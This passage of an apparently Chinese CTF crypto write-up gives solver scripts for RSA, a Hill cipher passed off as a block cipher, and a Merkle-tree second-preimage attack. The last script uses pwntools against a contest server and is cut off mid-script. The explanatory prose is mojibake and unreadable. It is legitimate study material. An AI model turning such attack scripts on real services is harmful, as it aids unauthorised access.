title="EasyRSA"></a>EasyRSA</h2><p>è¿™é¢˜ä¹Ÿå¾ˆç®€å•. è¿ç®—ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°Nå’Œphiäº†(å¤ªç™½ç»™äº†å‘€<br>ç„¶åæ­£å¸¸è§£rsaå°±è¡Œäº†<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-40a5d5b833e84712955672210c1e96e7.png" alt="å›¾ç‰‡.png"><br>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">pandq = <span class="number">20029167198807103822294848708534176719693827885584335928109682356494141073775700355124993345488062063358756812142730873692437534641839672970148348433433440</span></span><br><span class="line">p2andq2 = <span class="number">208680638196054793779950396947640995086963335225314494211048436767328157403385847902708950876722819363430805183637917486948883719184952031896287718282687710627112461479842558330512185988841693609451411485248346255881435015800175737788918607504412656254312427601603342579907641505150315471704698521905016530338</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">91507581287268678382704102499829526115486105502321675954617344102253738157075000438078155655317661988277710347178352070963528948558320623410799852584156693215831487103699955781123962661928296191496664400110250226880815518273669335738236882265242192523589233915770596106654695524214247405913652100286077779879</span></span><br><span class="line"></span><br><span class="line">n = (pandq ** <span class="number">2</span> - p2andq2) // <span class="number">2</span></span><br><span class="line">phi = n - pandq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡ºå°±æ˜¯flagäº†<br><a name='22'></a></p><h2 id="Go-home"><a href="#Go-home" class="headerlink" title="Go home"></a>Go home</h2><p>è¿™é¢˜å¤ªè¿·å•¦â€¦åˆ°ç°åœ¨éƒ½è¿˜æ²¡æ‡‚å‡ºé¢˜äººçš„æ„æ€.<br>ç»™å‡ºçš„é¢˜ç›®æ˜¯è¿™æ ·çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0xc3d945bc033ff7dd932ba62d8ef506cb37f5fe8e45abdac07660c7ac2af97d3ce723710384046c1bd967e92b0e03666d7c0bcbd4043b39ee128e5a1c98b5367044a4e72a4868fdc4824e8f0f3074da2857a414c9dfd7bf208d41caefeac144a45a6ca225975b0fced05d85d6e95dc7c2fa303c8a69185b75b8b3fd7f3fe0b9b5</span></span><br><span class="line">p = <span class="number">0xdfe9dd9c9e9987e2fdb230fb346cefa87893afed5d1b4240872ec5b2dfc3b397ecbbf9b54ae6e9b7be150cdc79de1e87d2d674352b857ae4e000000000000000</span></span><br><span class="line">c=<span class="number">0xe1ea04df467b48a7fa372d9374959571a084341041ec71f57e661cedfb517dbf1cc05a305edeb56ce0d2e29a98790a1cd538b31203a8ff7ea79aee1b3ad8629eac19607dce66f9138e3b376a8e915e24d209a23cb8e1a02c6030d840ceb4203</span></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æ‹¿åˆ°é¢˜çš„æ—¶å€™, ç¡®å®æ˜¯æ²¡æƒ³åˆ°è¿™é‡Œç»™çš„pæ˜¯pçš„é«˜ä½. çŸ¥é“çš„è¯å°±æ‡‚æ˜¯coppersmithäº†.<br>æ‰€ä»¥ä¸€å¼€å§‹æ‹¿åˆ°é¢˜æ˜¯å»åˆ†è§£næ¥ç€, yafuä¹Ÿç¡®å®åˆ†å‡ºpè·Ÿqæ¥äº†(è·Ÿå‡ºé¢˜äººèŠäº†ä¸‹é¢„æœŸè§£åº”è¯¥æ˜¯ç”¨coppersmithçš„<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-7caf65e71a8c4b8b88b15bac25dcfa56.png" alt="å›¾ç‰‡.png"><br>å› ä¸ºé¢˜ç›®ä¹Ÿæ²¡ç»™å…¬é’¥e, æ‰€ä»¥è¯•ç€å»çˆ†ç ´äº†ä¸€ä¸‹e, ç„¶è€Œä¹Ÿæ²¡çˆ†å‡ºç»“æœ.(äº‹å®ä¸Šåº”è¯¥æ˜¯æœ‰ç»“æœçš„, å½“e=3çš„æ—¶å€™è‚¯å®šèƒ½å¾—å‡ºç»“æœ, ä½†å› ä¸ºè¿‡æ»¤æ˜¯åˆ©ç”¨å­—ç¬¦ä¸²ctf{<br>, æ‰€ä»¥æ²¡æœ‰çˆ†å‡ºç»“æœæ¥.</p><p>äºæ˜¯å°±å¡ä½äº†â€¦ </p><p>å› ä¸ºpå¾ˆå¥‡æ€ª(æ²¡æƒ³åˆ°è¿™ä¸ªæ˜¯pçš„é«˜ä½, å¯¼è‡´æˆ‘è§‰å¾—cå’Œpè°ƒæ¢è¿‡æ¥äº†. æƒ³çœ‹çœ‹cæ˜¯å¦æ˜¯ç´ æ•°, æ‰”è¿› <a href="http://www.factordb.com/">www.factordb.com</a> å‡ºæ¥äº†ä¸€ä¸ªæ„æƒ³ä¸åˆ°çš„ç»“æœ<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-a98bb7722c6c468e8063cf8bdb18334f.png" alt="å›¾ç‰‡.png"><br>å•Šè¿™â€¦ä¸‰æ¬¡æ–¹???<br>äºæ˜¯è¯•ç€å¯¹cå¼€ä¸‰æ¬¡æ–¹æ ¹, ç„¶åè½¬æˆå­—ç¬¦ä¸². ç¡®å®å¾—åˆ°äº†åœ¨å¯æ‰“å°å­—ç¬¦èŒƒå›´å†…çš„ä¸€æ®µå­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ardyPq2]2lb]A_1q_p]_p1]qm]dsllw&#123;</span><br></pre></td></tr></table></figure><p>ctf,ard ctf,ard ctf,ard<br>å¯¹åº”å­—æ¯éƒ½æ˜¯ä½ç§»2ä½çš„!<br>æ‰”è¿›å·¥å…·é‡Œä½ç§»å›æ¥å°±å¾—åˆ°<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6a70c19ef75649d58cdf2a1d9f7f46ee.png" alt="å›¾ç‰‡.png"><br>(æ‰€ä»¥æœ€åè¿˜æ˜¯æƒ³åæ§½ä¸€ä¸‹, èƒ½åšå‡ºè¿™é¢˜çœŸçš„è¿æ°”maxäº†.<br><a name='23'></a></p><h2 id="block-cipher"><a href="#block-cipher" class="headerlink" title="block cipher"></a>block cipher</h2><p>è¿ä¸Šè¿œç¨‹æŸ¥çœ‹æºç , å‘ç°æ˜æ˜æ˜¯ä¸ªhillå¯†ç !(åå­—å´å«åˆ†ç»„å¯†ç (ç‹—å¤´<br>å¾ˆæ˜¾ç„¶åŠ å¯†å°±æ˜¯å°†padä¹‹åçš„æ˜æ–‡åˆ†ä¸ºæ¯16ä¸ªå­—èŠ‚ä¸€ç»„,æ„æˆ4*4çš„çŸ©é˜µ,æ¯ç»„éƒ½å’Œå¯†é’¥çŸ©é˜µåšæ¨¡ä¹˜æ¨¡æ•°ä¸º256.</p><p>æ‰€ä»¥åªéœ€è¦æ„é€ ä¸€ä¸ªåœ¨mod256æ„ä¹‰ä¸‹å­˜åœ¨é€†çŸ©é˜µçš„çŸ©é˜µ, å°†è¿™ä¸ªåŠ å¯†ååªéœ€è¦ä¹˜ä¸Šå®ƒçš„é€†çŸ©é˜µå°±å¯ä»¥å¾—åˆ°å¯†é’¥çŸ©é˜µäº†.å†æ±‚å‡ºå¯†é’¥çŸ©é˜µçš„é€†çŸ©é˜µ, å°±å¾—å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†. </p><p>å¯¹äºæ±‚æ¨¡256é€†çŸ©é˜µ, åªä¸è¿‡æ˜¯åœ¨åŸå…ˆæ±‚é€†çŸ©é˜µçš„åŸºç¡€ä¸Šå°†æ‰€æœ‰çš„è¿ç®—æ”¹æˆæ¨¡256çš„æ„ä¹‰ä¸‹è¿›è¡Œå°±è¡Œäº†.</p><p>ä¸ºäº†èŠ‚çœæ—¶é—´, åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªç°æˆçš„æ±‚æ¨¡é€†çŸ©é˜µçš„è„šæœ¬, ç„¶åå†ä¿®æ”¹äº†ä¸€äº›ç»†èŠ‚.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  <span class="comment"># è®¡ç®—è¡Œåˆ—å¼çš„å€¼</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">ValueError</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥çŸ©é˜µæ ¼å¼æ˜¯å¦åˆæ³•ä»¥åŠæ˜¯å¦å¯é€†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_matrix</span>(<span class="params">A, M</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A, <span class="built_in">list</span>)) <span class="keyword">or</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A[<span class="number">0</span>], <span class="built_in">list</span>)) <span class="keyword">or</span> (<span class="keyword">not</span> <span class="built_in">isinstance</span>(A[<span class="number">0</span>][<span class="number">0</span>], <span class="built_in">int</span>)):</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;Invalid matrix format.&#x27;</span>)</span><br><span class="line">    mat = np.array(A)</span><br><span class="line">    D = <span class="built_in">int</span>(np.linalg.det(A)) % M</span><br><span class="line">    <span class="keyword">if</span> gcd(D, M) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;This matrix does not have a modular inversion matrix.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># çŸ©é˜µçš„ç¬¬ä¸€ç±»åˆç­‰å˜æ¢ï¼šäº¤æ¢çŸ©é˜µç¬¬iè¡Œä¸ç¬¬jè¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span>(<span class="params">A, i, j</span>):</span></span><br><span class="line">    temp = A[j]</span><br><span class="line">    A[j] = A[i]</span><br><span class="line">    A[i] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># çŸ©é˜µçš„ç¬¬äºŒç±»åˆç­‰å˜æ¢ï¼šå°†çŸ©é˜µç¬¬iè¡Œä¹˜ä»¥n</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_n</span>(<span class="params">A, i, n, M</span>):</span></span><br><span class="line">    a = A[i]</span><br><span class="line">    A[i] = [a[x] * n % M <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># çŸ©é˜µçš„ç¬¬ä¸‰ç±»åˆç­‰å˜æ¢ï¼šçŸ©é˜µç¬¬iè¡Œå‡å»nå€çš„jè¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">A, i, j, n, M</span>):</span></span><br><span class="line">    a = A[i]</span><br><span class="line">    b = A[j]</span><br><span class="line">    A[i] = [(a[x] - n * b[x]) % M <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„ç¬¬iè¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_row</span>(<span class="params">A, i, M</span>):</span></span><br><span class="line">    start = i</span><br><span class="line">    <span class="keyword">while</span> A[start][i] == <span class="number">0</span> <span class="keyword">or</span> gcd(A[start][i], M) &gt; <span class="number">1</span>:</span><br><span class="line">        start = start + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›ä¸€ä¸ªæ•´æ•°çš„æ¨¡é€†å…ƒç´ </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_rev</span>(<span class="params">num, mod</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (num == <span class="number">0</span> <span class="keyword">or</span> gcd(num, mod) &gt; <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">raise</span> MyError(<span class="string">&#x27;modular inversion does not exists.&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i * num % mod != <span class="number">1</span>:</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disp</span>(<span class="params">mat</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat[i])):</span><br><span class="line">            print(mat[i][j], end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_rev</span>(<span class="params">A, M</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        check_matrix(A, M)</span><br><span class="line">        dim = <span class="built_in">len</span>(A)</span><br><span class="line">        <span class="comment"># concatenate with a unit matrix</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                <span class="keyword">if</span> j == i:</span><br><span class="line">                    A[i].append(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    A[i].append(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># transform</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            target_row = find_row(A, i, M)</span><br><span class="line">            swap(A, i, target_row)</span><br><span class="line">            n = mod_rev(A[i][i], M)</span><br><span class="line">            mul_n(A, i, n, M)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                <span class="keyword">if</span> j != i:</span><br><span class="line">                    sub(A, j, i, A[j][i], M)</span><br><span class="line">        <span class="comment"># get result</span></span><br><span class="line">        A_rev = [A[i][dim:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim)]</span><br><span class="line">        <span class="keyword">return</span> A_rev</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A = [[<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">43</span>], [<span class="number">42</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">44</span>], [<span class="number">42</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">42</span>], [<span class="number">41</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>]] <span class="comment"># å‘é€è¿‡å»çš„æ˜æ–‡çš„çŸ©é˜µå½¢å¼</span></span><br><span class="line">M = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">AINV = matrix_rev(A, M)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A = &#x27;***+**),*)**)***&#x27; å‘é€è¿‡å»çš„æ˜æ–‡</span></span><br><span class="line">encA = <span class="string">&#x27;6a9acfbf3dc3bf1265ea2e6a470404c1&#x27;</span>  <span class="comment"># æ‰€è¿”å›çš„å¯†æ–‡</span></span><br><span class="line">enc_flag = <span class="string">&#x27;1017b9907716c35955305cbd50481660de262f48955ca48a6f97630d2cc7bb2e4f41b2a0bbce4c43575b234fff6455b0&#x27;</span>  <span class="comment"># åŠ å¯†ä¹‹åçš„flag</span></span><br><span class="line">enc_A = np.array([<span class="built_in">int</span>(encA[i:i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encA), <span class="number">2</span>)]).reshape(<span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">key = np.matmul(enc_A, AINV) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    æ‰‹åŠ¨å°†keyè½¬æˆkçš„å½¢å¼äº†</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">k = [[<span class="number">113</span>, <span class="number">213</span>, <span class="number">10</span>, <span class="number">58</span>],</span><br><span class="line">     [<span class="number">178</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">13</span>],</span><br><span class="line">     [<span class="number">216</span>, <span class="number">204</span>, <span class="number">16</span>, <span class="number">149</span>],</span><br><span class="line">     [<span class="number">189</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">189</span>]]</span><br><span class="line">keyinv = np.array(matrix_rev(k, M))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc_flag), <span class="number">32</span>):</span><br><span class="line">    encflag = enc_flag[i:i + <span class="number">32</span>]</span><br><span class="line">    enc_F = np.array([<span class="built_in">int</span>(encflag[j:j + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encflag), <span class="number">2</span>)]).reshape(<span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line">    f = np.matmul(keyinv, enc_F) % <span class="number">256</span></span><br><span class="line">    f = f.reshape(<span class="number">16</span>, )</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag:ctf{yes-sure-the-plain-is-blocked-right?}<br><a name='24'></a></p><h2 id="ant-forest"><a href="#ant-forest" class="headerlink" title="ant forest"></a>ant forest</h2><blockquote><p>è¿™é¢˜å±…ç„¶åªæœ‰ä¸¤ä¸ªäººåšçœŸçš„â€¦å¯èƒ½å¤§å®¶éƒ½è§‰å¾—æºç å¤ªé•¿äº†ä¸æƒ³çœ‹å§?æˆ‘ä¸ªäººæ˜¯æ„Ÿè§‰ä¸€ç‚¹éƒ½ä¸éš¾çš„</p></blockquote><p>é¢˜ç›®çš„æºç ä¸è´´äº†. å¤§æ¦‚æ˜¯åœ¨å»ºä¸€ä¸ªé»˜å…‹å°”æ ‘(è¿™ä¸ªé»˜å…‹å°”æ ‘æˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦.<br>ç½‘ä¸Šæ‰¾äº†å¼ å›¾, å°±æ˜¯ä»åº•éƒ¨çš„å¶å­å¼€å§‹, å“ˆå¸Œä¹‹åä¸¤ä¸ªä¸¤ä¸ªä¸ºä¸€ç»„, ç›¸åŠ å†å“ˆå¸Œå¾—åˆ°æ–°çš„ä¸€å±‚, ç›´åˆ°å¾—åˆ°æ ¹èŠ‚ç‚¹.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-c5a4225fec7e4444819c3167d0a37883.png" alt="å›¾ç‰‡.png"></p><p>è€Œé¢˜ç›®çš„è¦æ±‚å°±æ˜¯è¾“å…¥ä¸¤æ¬¡å¶å­èŠ‚ç‚¹, ä¸¤æ¬¡çš„è¾“å…¥ä¸èƒ½ç›¸åŒä½†æœ€åçš„æ ‘æ ¹æ˜¯ç›¸åŒçš„.ä»”ç»†æƒ³æƒ³å…¶å®å¹¶ä¸éš¾, ç¬¬äºŒæ¬¡ç”Ÿæˆæ ‘çš„å¶å­èŠ‚ç‚¹æ˜¯ç¬¬ä¸€æ¬¡ç”Ÿæˆçš„æ ‘çš„å…¶ä¸­ä¸€å±‚å°±è¡Œäº†.(ä¼¼ä¹æ˜¯å«ç¬¬äºŒæ¬¡åŸåƒæ”»å‡»?</p><p>çŸ¥é“åŸç†ä¹‹åå°±å¼€å§‹å†™è„šæœ¬äº†, ä½†æ˜¯è¿‡ç¨‹ä¸å¤ªé¡ºåˆ©, å› ä¸ºpython3å¤ªå¤šæ•°æ®ç±»å‹äº†(è½¬æ¥è½¬å»å®åœ¨æ˜¯å¤ªé¸¡å„¿éº»çƒ¦äº†â€¦</p><p>æ‰€ä»¥å†³å®šç”¨python2å†™è„šæœ¬(ç¡®å®è¯¥ç”¨py2å†™ä¸ç„¶å¤ªä¹±äº†â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dohash</span>(<span class="params">dat</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sha256(sha256(dat).digest()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;139.199.203.26&#x27;</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256(start + END).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;XXXX:&#x27;</span>)</span><br><span class="line">END = re.findall(<span class="string">r&#x27;sha256\(XXXX\+(.*)\)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">r&#x27;== (.*)&#x27;</span>, resp)[<span class="number">0</span>]</span><br><span class="line">con.sendline(proof(END, SHA))</span><br><span class="line">con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    con.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    con.recv()</span><br><span class="line">    con.send(dic[_])</span><br><span class="line">    con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">con.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">con.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">a = dohash(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = dohash(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">c = dohash(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = dohash(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ab = a + b</span><br><span class="line">cd = dohash(c + d).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(ab)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">con.send(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">con.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span 